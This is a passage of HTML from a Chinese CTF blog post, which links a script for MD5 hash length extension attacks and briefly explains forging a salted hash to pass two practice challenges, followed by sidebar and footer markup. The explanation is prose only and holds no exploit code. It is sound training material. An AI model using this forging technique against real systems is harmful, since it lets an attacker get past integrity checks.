href="http://ese5a1b0c1d60t.pri.qiqiuyun.net/course-activity-18/20180306120724-ngze29qadxwsosoo?attname=md5-extension-attack-master.zip&amp;e=1521271777&amp;token=ExRD5wolmUnwwITVeSEXDQXizfxTRp7vnaMKJbO-:zzcFnwG8yWdXqq75b9W8hJzTk5E=" target="_blank" rel="noopener">这里是MD5pad.py的脚本</a>，集合了上述两步直接出结果。具体用法参照下文。<br>现在来实战看看：<br><img src="/images/4/3.jpg" alt=""><br>题目的意思就是让你传入两个变量的值，role和hash，使得hash的值是salt加上你输入role的MD5，具体操作如下：<img src="/images/4/1.png" alt="">随后把role和hash的值post一下就行了。<br>这一道是实验吧的题目：<br>抓包把可疑参数source改为1，就得到了如图所示的内容：<img src="../images/4/2.png" alt="">分析代码不难看出要构造一个getmein参数和salt加username和password的MD5值相等，用脚本跑一下就出来了。<img src="../images/4/3.png" alt="">把参数一一对应post过去即可。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/03/14/0x04-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjn3ccg8g000abkvevmnqwuq7" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>

    </footer>
  </div>
  
</article>




  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/">&laquo; pre</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">next &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Iuhrey的幻想乡</h1>
    <h2 class="blog-subtitle">记录日常所学</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>24</strong><br>文章</div></a>
      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友情链接</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
          喜欢啥几把BB的狗骑驴
        </a>
      
        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
          喜欢gay在狗骑驴旁边的狗逼
        </a>
      
        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
          gay里gay气的大黄
        </a>
      
        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
          郁离歌大手子的博客
        </a>
      
        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
          有很多小姐姐的烧包包
        </a>
      
    </div>
  </div>
</div>

  
</aside>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=478384&auto=1&height=66"></iframe>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2017 - 2018 Iuhrey<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
      
    </div>
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>



  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>
<script src="/js/script.js"></script>



  </div>
</body>
</html>